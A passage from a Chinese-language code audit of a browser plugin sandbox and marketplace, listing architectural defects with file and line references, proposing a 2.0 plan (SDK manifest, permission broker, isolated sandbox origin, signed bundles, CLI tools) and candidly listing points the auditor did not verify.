2. **一份规则，多处常量**：RPC 频率/体积/超时同时写死在 `host.ts:36-41`、`sdk.js:17-18`、`shared/plugin-spec.js:21-40`、`runner.html:58-60`，且数值不一致（24 KB vs 64 KB）。
3. **版本号双源且 CI 不覆盖**（`shared/plugin-spec.js:15` vs `src/lib/version.ts:12`；`check-version.mjs:9-42`）。
4. **没有 SDK 类型包 / 没有错误码枚举**（`plugin-spec.d.ts` 只覆盖 manifest；错误码是散字符串）。
5. **没有插件 spec 的单元测试**：`validateManifest` / `validateBundle` / `canonicalFilesJson` 是三个消费方共用的核心，`vitest.config.ts` 只收 `tests/unit/**`，其中没有插件相关用例；唯一沙箱测试 `tests/e2e/sandbox.spec.ts` 跑在**无 Worker 的静态服务器**上（`playwright.config.ts` webServer = `scripts/serve-dist.mjs`），因此从未验证过真实 CSP。
6. **QA 脚本与代码脱节**：`plugins-qa.mjs:135` 期待 1.7.0；文档 `PLUGINS-1.7.md:421/439` 的 65/65、17/17 无产物（`test-results/` 只有 `.last-run.json`）。
7. **插件状态存在 localStorage**（`store.ts:16`）：单记录 ~数十 KB × 24 插件，与用户数据抢配额；无版本化迁移（`store.ts:52-55` 只判 `v !== 1` 就整份丢弃）。
8. **主题/笔记/日历副作用写进宿主库**（`themes.ts:522-529`、`adapters.ts:72/152`），卸载没有反向补偿。
9. **`entryCache` 无上限**（`host.ts:102`、`120-130`），只按 id 清理（`132-138`），长会话下整包 HTML 常驻内存。
10. **CLI 与 OS 版本解耦**（`cli/guandao.mjs:34`、`403`），模板持续产出过期的 `minimumOSVersion`。

---

## 7. 2.0 增量方案（不动已验证沙箱）

**原则：把"传输层"冻结成 v1，把"能力层"版本化。** 已通过 `sandbox.spec.ts` 的三件事——双层 `allow-scripts`、nonce 握手、MessagePort 单会话绑定——不要动。

### 7.1 稳定 SDK 1.x（能力层版本化）

1. **单一能力清单**：新建 `shared/sdk-manifest.json`，每项声明 `{ method, module, since, deprecatedIn?, removedIn?, permission, payloadLimit, returns, errors[] }`。用 codegen 生成：`host.ts` 的 `METHOD_PERMISSION`（替换 `host.ts:63-89`）、`sdk.js` 的方法表、`developers.astro` 的 SDK 表格、`cli` 的 Mock Host。CI 里 diff 生成物，防漂移。
2. **握手协商**：`MOUNT` 的 `context` 里带上 `sdk: { version: 1, methods: [...] }`（现在只有 `sdkVersion: 1`，`host.ts:262-268`）。插件可 `guandao.has("widget.setTitle")` 探测；宿主对未声明的方法直接 `UNSUPPORTED_METHOD`，而不是现在的 `UNKNOWN_METHOD` 兜底（`host.ts:367-370`）。
3. **废弃策略**：`deprecatedIn` 起，宿主仍执行但在 RESULT 里附 `deprecation: {...}`，SDK 侧 `console.warn` 一次；`removedIn` 才真删。承诺"1 个 SDK major ≥ 2 个 OS minor"。
4. **错误码集中**：`shared/sdk-errors.js` 导出枚举，SDK 侧生成 `guandao.errors`，文档生成错误表。当前 `PERMISSION_DENIED / RATE_LIMITED / PAYLOAD_TOO_LARGE / TIMEOUT / UNKNOWN_METHOD` 散落（`host.ts:360-392`）。
5. **类型包**：由 `sdk-manifest.json` 生成 `types/guandao-sdk.d.ts` 并随 CLI `create` 模板附带；解决 `plugin-spec.d.ts` 只覆盖 manifest 的问题。
6. **版本单一真相**：`shared/plugin-spec.js` 改为从生成的 `shared/version.js` 取 `OS_VERSION`（build 时由 `package.json` 写入），并把 `check-version.mjs:9-42` 的检查清单扩到它；顺手修掉 `plugins-qa.mjs:135`。

### 7.2 统一权限 Broker（Host 仍是唯一执行点）

- 抽出 `src/lib/plugins/broker.ts`：`(method, payload, grantSet) → allow | deny(code)`，表由 §7.1 的 codegen 产出；`host.ts` 只保留生命周期与传输。当前 `dispatch` 里的二十多个 case（`host.ts:410-633`）按模块拆成 `handlers/ui.ts`、`handlers/storage.ts` 等，每个 handler 自带参数校验，**返回值 schema 与 SDK 文档同源**。
- 服务端镜像：`worker/api/plugins/*` 继续独立校验（现在是第二道防线，`handlers.js:489-494 / 596-615 / 665 / 1161-1167`），但权限 ID 与错误码来自同一份 `shared/sdk-manifest.json`，避免"客户端拒了、服务端放行"这类漂移。
- **默认拒绝的可见化**：把"哪些方法因为缺哪个权限被拒"写进 `logs`（现在只有一句 `appendLog`，`host.ts:386`），管理器直接展示"该插件本周被拒 3 次（缺 notes.create）"。
- **跨标签页一致性**：`granted` 不存快照，改为每次 RPC 读 `getInstall(id)?.granted`（`localStorage` 读的代价可接受，60 次/10 秒上限内），或监听 `storage` 事件让会话自我销毁。

### 7.3 沙箱加固（不改变已验证部分）

- **保留**：`allow-scripts`-only、nonce 握手、`event.source` 身份、MessagePort 绑定、`<meta>` CSP。
- **新增 A（推荐）**：把 `public/sandbox/` 部署到 **独立源** `sandbox.guandao.xin`（`PLUGINS-1.7.md:216-227` 已写好步骤），宿主 CSP 只放行该源。收益：跨 site → 独立渲染进程 → 真正实现"卡死只影响自己"，并为 7.3-B 的进程内看门狗提供可能。
- **新增 B**：心跳。`READY` 之后插件每 5 s 发 `ping`（或宿主发 `ping`，插件回 `pong`），3 次丢失 → `destroy()` + 管理器提示"插件无响应"。目前 `READY` 之后完全没有存活检测（`host.ts:294-332`）。
- **保留 C**：导航检测继续做，但把它从"事后封禁"升级为"事后封禁 + 服务端上报"（新增 `POST /api/plugins/:id/report-self`，用现有 `plugin_reports` 表，`0010_plugins.sql:165-178`），让作者承担成本。
- **保留 D**：`frame.setAttribute("csp", ...)`（`runner.html:142`）要么删掉（它是无效属性），要么换成注释说明"真正的策略在 meta"。留着会误导后续维护者。

### 7.4 供应链（签名链）

1. `developer_keys (user_id, algo, public_key, created_at, revoked_at)`；CLI `publish` 用本地私钥对 `sha256(bundle)` 签名（Ed25519，`node:crypto` 原生支持，不引入依赖）。
2. `plugin_versions` 增加 `publisher_key_id` / `signature`（`0010_plugins.sql:75-93` 现在是纯哈希）。
3. 客户端 `verifyBundle` 增加一步：`verify(signature, packageDigest, publisherKey)`，公钥随 `/api/plugins/:id` 返回并缓存；失败即拒绝安装（`bundle.ts:40-76`）。
4. 审核 UI 增加"查看包内文件树 + 与上一版 diff"（后端已有 `pluginFile` 读取能力，`handlers.js:322-364`，只需前端加视图），把 §5-14 的能力补上。

### 7.5 CLI / 开发者平台

- 新增 `test`（headless 打开 `dev` 的 harness，跑最小启动 + `app.context` 断言）、`doctor`（Node 版本 / 网络 / 登录态）、`publish --dry-run`（只跑本地校验 + 打印将发送的请求体）、`--json` 输出与语义化退出码。
- `dev`/`preview` **直接复用 `public/sandbox/runner.html`**，删掉 `HARNESS_JS`（`cli/guandao.mjs:475-571`），把"四份协议"降为"两份"。
- `package` 与 `build` 合并或明确别名关系（当前 `831-832` 完全等价，文档却写成两件事）。
- 版本：`CLI_VERSION` 与 `minimumOSVersion` 从 `shared/version.js` 取，别再硬编码 1.7.0。

---

## 8. 无法确认的点

1. **未运行任何测试**：本次为只读审计，没有执行 `npm run qa:plugins`、`qa:plugins:ui`、`npx playwright test`。文档里的 65/65、17/17（`PLUGINS-1.7.md:421`、`439`）无本地产物可核（`test-results/` 仅 `.last-run.json`），且 `plugins-qa.mjs:135` 与当前 `OS_VERSION` 已不一致，**该数字应视为过期**。
2. **生产环境真实状态未知**：`0010_plugins.sql` 是否已在线上执行、市场里是否有真实插件与安装记录、R2 bucket 是否有对象，均无法从代码确认（`wrangler.jsonc` 只有 binding 名）。
3. **渲染进程分配**：blob: iframe 是否与宿主同进程取决于浏览器版本与站点隔离策略，未实测；§1.5/§5-6 的结论基于"同 site 通常同进程"，需在目标 Chrome 版本上实测（可在插件里 `while(true)` 验证）。
4. **`/sandbox/runner`（无扩展名）在 Cloudflare Static Assets 上的行为**：`host.ts:32-34` 的注释称会被 307 到无扩展名路径，未在真实环境验证；若未回落，所有插件启动都会 404。
5. **`csp` 属性的实际效果**：结论"无效"基于该属性未进入标准实现，未在所有目标浏览器上逐一验证。
6. **`localStorage` 配额**：6 MB 上限来自插件配额乘积与常见浏览器 5 MB 的经验值，未在目标浏览器实测具体配额。
7. **`saveCustomTheme` 的跨版本行为**：主题残留（§5-12）结论基于"卸载不调用 `deleteCustomTheme`"，未验证主题中心是否有其它清理路径（本次未逐行读完 `themes.ts` 1060 行，只读了 `474-536`）。
8. **服务端 `assertSameOrigin` 的完整覆盖面**：只确认了它同步执行且被 `handlers.js:82` / `developer.js:55` 调用；`docs/PLUGINS-1.7.md:435` 提到的"曾漏 await"已修复（当前函数非 async），但没有回归测试覆盖。